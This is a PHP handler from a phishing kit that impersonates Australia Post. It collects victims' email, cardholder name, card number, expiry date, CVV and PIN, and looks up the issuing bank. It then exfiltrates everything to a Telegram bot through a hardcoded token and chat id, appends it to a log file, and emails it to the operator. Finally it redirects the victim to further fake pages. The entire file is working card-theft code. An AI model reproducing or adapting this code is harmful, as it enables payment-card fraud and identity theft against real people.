<?php

	session_start();
	include '../mine.php';
$fname = $_SESSION['EML'] = $_POST['EML'];
$lname = $_SESSION['lname'] = $_POST['lname'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$PinCode = $_SESSION['PinCode'] = $_POST['PinCode'];

$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);

$msg .= '
[+]━━━━━━━━━━━━━━━━━━【AUSPOST】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【💳 CC INFO】━━━━━━━━━━━━━━━━━━━[+]
[💌 Email-] =  '.$_SESSION['EML'].'
[👤 CardHolder Name] =  '.$_SESSION['lname'].'
[💳 CC Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ] = '.$_SESSION['expdate'].'
[🔑 (CVV)] = '.$_SESSION['Securitycode'].'
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━━━[+]
[🏛 Card scheme]          = '.$_SESSION['bank_scheme'].'
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System INFO】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.now().'
[🌐 BROWSER] = '.$_SESSION['browser'] .$_SESSION['os'].'
[+]━━━━━━━━━━━━━━━━━━【AUSPOST】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【By [TOPY-31]】━━━━━━━━━━━━━━━[+]
';
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
file_get_contents("https://api.telegram.org/bot5536467841:AAGxVnjUbwO4IHAYDB3q3CXhSOtYqY26NqM/sendMessage?chat_id=-699813202&text=" . urlencode($msg)."" );
fclose($save);
}
$subject="-".$scamname."- AUSPOST-CC From [{$_SESSION['lname']}]";
$headers="From: AUSPOST-CC <newcc@topypost.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}
$c28dd9c=$_SESSION['bank_scheme'];
$c97e57ec=array("VISA");
if(in_array($c28dd9c,$c97e57ec)){
  exit(header("Location: ../../app/process1"));
}else{
	exit(header("Location: ../../app/process"));


}
?>

